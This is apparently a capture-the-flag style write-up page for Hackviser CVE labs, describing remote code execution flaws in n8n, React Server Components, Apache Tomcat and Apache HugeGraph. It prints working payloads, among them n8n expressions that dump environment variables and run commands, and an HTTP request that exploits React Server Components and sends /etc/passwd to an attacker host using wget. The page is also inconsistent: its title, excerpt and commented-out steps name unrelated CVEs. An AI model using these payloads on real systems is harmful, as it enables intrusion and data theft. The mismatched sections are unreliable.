---
title: 'CVE 2026'
date: '2026-05-04'
excerpt: 'CVE-2026-43284 & CVE-2026-43500, CVE-2026-42945, CVE-2026-31431, CVE-2026-42167, CVE-2026-29058, CVE-2026-2329, CVE-2026-1357, CVE-2026-24061'
prog: 'Hackviser CVE Labs  -  May 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_hackviser_logo.webp" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">CVE 2025</h1>
<div class="writeup-date">May 2026 · CVE Labs</div>
</div>
</div>
<p class="lead mb-4">Practice Common Vulnerabilities and Exposures Labs</p>

<h4 class="mb-2"><strong>1. n8n Remote Code Execution (CVE-2025-68613)</strong></h4>
<p class="mb-3">n8n is a source-available, open-source workflow automation tool that enables users to connect applications, APIs, and data sources through a visual, node-based interface to automate tasks without deep coding knowledge. It is widely used for integrating disparate services and creating complex logic flows. This laboratory contains the CVE-2025-68613 vulnerability identified in n8n versions starting from 0.211.0 and prior to 1.120.4, 1.121.1, and 1.122.0. This critical vulnerability allows an authenticated attacker to escape the sandbox environment used for expression evaluation. Under certain conditions, malicious JavaScript expressions injected by users with workflow editing permissions are evaluated in a context that allows access to global Node.js objects. This flaw leads to Remote Code Execution (RCE) on the server with the privileges of the n8n process. 
<br />
Exploitation Steps: To exploit this vulnerability, you must first log in using the provided credentials and create a workflow. Add an "Edit Fields" (or Set) node, switch a parameter to Expression mode, and use the following payloads:
<br />
<strong>1. Reconnaissance: Dump Environment Variables</strong><br />
Check if you can access the process environment to see sensitive keys.</p>

```javascript
{{ (function(){ return this.process.env; })() }}
```
<p class="mb-3"><strong>
2. Verification: Remote Code Execution (RCE)</strong><br />
Verify remote code execution by running the id command.</p>

```javascript
{{ (function() {
 var require = this.process.mainModule.require;
 var execSync = require('child_process').execSync;
 return execSync('id').toString();
})() }}
```

<p class="mb-3">Credentials: HTTP Port: <code>5678</code>, Username: <code>admin@local.hv</code>, Password: <code>Password1337!</code> <br />Exploit the vulnerability to read the /secret.txt file on the server. What is the secret content?</p>
<p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-44228</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<!-- <img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-44228/cvelabs_cve-2021-44228_image1.png" alt="CVE-2021-44228 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. Apparently an error in exploit execution occured.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-44228/cvelabs_cve-2021-44228_image2.png" alt="CVE-2021-44228 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">To solve this problem, we need to enter <code>set SRVHOST [local_IP]</code>. Then run <code>exploit</code> again. A command shell will open and we can query the contents of secret.txt</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-44228/cvelabs_cve-2021-44228_image3.png" alt="CVE-2021-44228 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
<p class="mb-5"><strong>Answer:</strong> </p>
<br />

<h4 class="mb-2">2. React Server Components Remote Code Execution (CVE-2025-55182)</h4>
<p class="mb-3">This laboratory demonstrates a critical vulnerability identified as CVE-2025-55182 (tracked as CVE-2025-66478 for Next.js). The flaw exists in the "Flight" protocol implementation used by RSC. Due to unsafe deserialization of payloads sent to Server Function endpoints, an unauthenticated attacker can execute arbitrary code on the server (RCE). This vulnerability has a critical severity score of CVSS 10.0. The vulnerability affects the following specific versions: React: Versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 and Next.js: Versions 15.x, 16.x, and Canary releases starting from v14.3.0-canary.77. The following Proof of Concept (PoC) payload exploits prototype pollution to trigger Remote Code Execution (RCE) and exfiltrates target data via an Out-of-Band (OOB) channel. The wget command within the payload reads the /secret.txt file and sends its content to the attacker's listener.</p>

```http
POST / HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 503

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require('child_process').exec('wget --post-file=/etc/passwd http://ATTACKER_SERVER');","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
<p class="mb-3">Note: The target machine has no internet access (air-gapped). You must set up a local listener (HTTP/POST) and direct the OOB request to your local IP address. Exploit the vulnerability to read the /secret.txt file on the server. What is the secret content?</p>
<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-3129</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-3129/cvelabs_cve-2021-3129_image1.png" alt="CVE-2021-3129 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Command shell session will open and we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-3129/cvelabs_cve-2021-3129_image2.png" alt="CVE-2021-3129 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
<p class="mb-5"><strong>Answer:</strong> </p>
<br />

<h4 class="mb-2">3. Apache Tomcat 9.0.0-9.0.98/10.1.0-10.1.34/11.0.0-11.0.2 Remote Code Execution (CVE-2025-24813)</h4>
<p class="mb-3">Apache Tomcat is an open-source web server and servlet container used to run Java-based web applications. This laboratory contains the CVE-2025-24813 vulnerability identified in Apache Tomcat versions 9.0.0-9.0.98, 10.1.0-10.1.34, and 11.0.0-11.0.2. This critical vulnerability arises from improper handling of partial PUT requests and flaws in the path equivalence mechanism. When write permissions are enabled on the default servlet and file-based session persistence is configured, the vulnerability allows attackers to perform remote code execution on the server. Attackers can upload JSP web shell files in chunks using the Content-Range header and execute arbitrary Java code through the session deserialization mechanism. What is the secret in the /secret.txt file?</p>
<!-- <p class="mb-3"><strong>Steps: </strong>First we need to perform a simple Nmap scan to identify which ports are open on the target machine.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-42013/cvelabs_cve-2021-42013_image1.png" alt="CVE-2021-42013 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Then we use Metasploit via <code>msfconsole</code>. Run <code>search CVE-2021-42013</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-42013/cvelabs_cve-2021-42013_image2.png" alt="CVE-2021-42013 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set RHOSTS [target_IP]</code>, <code>set RPORT 80</code>, <code>set SSL false</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. Once the Meterpreter session open and we simply run <code>shell</code> and then <code>cat /secret.txt</code> to obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-42013/cvelabs_cve-2021-42013_image3.png" alt="CVE-2021-42013 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
<p class="mb-5"><strong>Answer:</strong> </p>
<br />

<h4 class="mb-2">4. Apache HugeGraph Gremlin Remote Code Execution (CVE-2024-27348)</h4>
<p class="mb-3">Apache HugeGraph is a popular open-source graph database designed for managing and analyzing large-scale data with high performance. It supports the Gremlin query language for complex graph traversals. This laboratory features the critical CVE-2024-27348 vulnerability found in Apache HugeGraph Server versions prior to 1.3.0. The vulnerability exists in the Gremlin query execution engine, where sandbox restrictions can be bypassed. An unauthenticated remote attacker can send specially crafted Gremlin queries via the REST API to execute arbitrary Java code on the server (RCE). This allows the attacker to take full control of the database server. Note: Ensure that the payload selected during exploitation matches the target system architecture (x64). Exploit the vulnerability to read the /secret.txt file inside the server. What is the secret information inside?</p>
<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
<p class="mb-5"><strong>Answer:</strong> </p>

<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">May 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>